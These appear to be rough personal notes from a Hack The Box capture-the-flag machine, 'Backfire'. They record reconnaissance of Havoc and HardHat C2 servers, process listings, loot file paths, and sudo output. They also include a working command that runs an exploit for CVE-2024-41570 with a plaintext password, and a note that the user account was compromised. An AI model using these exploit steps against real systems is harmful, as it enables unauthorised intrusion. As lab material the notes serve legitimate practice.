

Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

*there should b websocket connection here*


there is a havoc C2 running on the machine


Havoc teamserver 
havoc client

client is used to connect to teamserver

beacons go to teamserver



both port 8000 and 443 are using HTTP/1.1


port 443 could be the listener for the C2 that would make sense but being proxied by nginx??? not sure

can I smuggle HTTP requests and reach the teamserver? the websocket/teamserver




*this command worked with the CVE*
python3 CVE-2024-41570.py -t https://backfire.htb:443 --ip 127.0.0.1 -p 40056 -U 'sergej' -P '1w4nt2sw1tch2h4rdh4tc2'




sergej      7020  3.5  6.7 274271308 268284 ?    Ssl  16:30   0:09 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
sergej      7097  1.5  3.2 274195056 128564 ?    Sl   16:30   0:03  _ /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client
sergej      7021  1.6  6.4 274255728 255100 ?    Ssl  16:30   0:04 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer0:02  _ /--More--(26%)
ilya        7511  4.0  0.5 1614172 20876 ?       Ssl  16:34   0:00 /home/ilya/Havoc/havoc server --profile /home/ilya/files/havoc.yaotl
  └─(Caps) 0x0000000000000400=cap_net_bind_service



hardhat is running as sergej

127.0.1.1	backfire.backfire.htb	backfire



/home/ilya/Havoc/data/loot/2025.08.13._16:34:01/teamserver.log
/home/ilya/Havoc/data/loot/2025.08.13._16:34:01/listener/DemonListener/server.key
server.crt   voc/data/loot/2025.08.13._16:34:01/listener/DemonListener/--More--(92%)
/home/ilya/Havoc/data/loot/2025.08.13._16:32:01/teamserver.log
/home/ilya/Havoc/data/loot/2025.08.13._16:32:01/listener/DemonListener/server.key
/home/ilya/Havoc/data/loot/2025.08.13._16:32:01/listener/DemonListener/server.crt
/home/ilya/Havoc/data/server.key
/home/ilya/Havoc/data/server.cert
/home/ilya/Havoc/data/teamserver.db


/home/ilya/Havoc/data/teamserver.db






theres another CVE for hardhat 




*got sergej*

sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save